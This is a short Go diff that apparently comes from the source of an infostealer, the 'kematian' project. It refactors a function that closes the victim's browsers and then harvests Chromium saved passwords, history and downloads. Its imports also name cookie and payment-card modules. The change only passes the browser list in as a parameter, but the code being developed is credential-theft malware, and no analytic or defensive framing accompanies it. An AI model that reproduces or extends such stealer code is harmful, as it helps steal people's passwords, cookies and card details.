@@ -5,7 +5,6 @@ import (
 	"kdot/kematian/browsers/chromium/cards"
 	"kdot/kematian/browsers/chromium/cookies"
 	"kdot/kematian/browsers/chromium/downloads"
-	"kdot/kematian/browsers/chromium/finder"
 	"kdot/kematian/browsers/chromium/history"
 	"kdot/kematian/browsers/chromium/pass"
 	"kdot/kematian/browsers/chromium/structs"
@@ -39,8 +38,7 @@ func GetBrowserDownloads(browsers []structs.Browser) {
 	os.WriteFile("downloads.json", []byte(downloads.Get(browsers)), 0644)
 }
 
-func GetBrowserData() {
-	totalBrowsers := finder.FindBrowsers()
+func GetBrowserData(totalBrowsers []structs.Browser) {
 	util.CloseBrowsers()
 	GetBrowserPasswords(totalBrowsers)
 	GetBrowserHistory(totalBrowsers)
